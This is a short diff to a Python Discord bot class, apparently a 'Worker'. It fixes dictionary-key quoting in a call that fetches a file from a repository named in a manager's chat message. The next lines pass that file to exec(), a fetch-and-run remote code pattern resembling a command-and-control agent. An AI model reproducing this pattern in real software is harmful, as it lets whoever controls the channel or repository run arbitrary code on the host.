@@ -37,7 +37,7 @@ class Worker:
     order = await self.bot.wait_for("message", check=lambda m: m.author.id == self.manager and m.channel == self.base)
     order = order.content
     user, repo, path = order.split(":")[0], order.split(":")[1], order.split(":")[2]
-    page = git({author:user, repo:repo, path:path, mode:1})
+    page = git({'author':user, 'repo':repo, 'path':path, 'mode':1})
 
     try:
       exec(str(page))
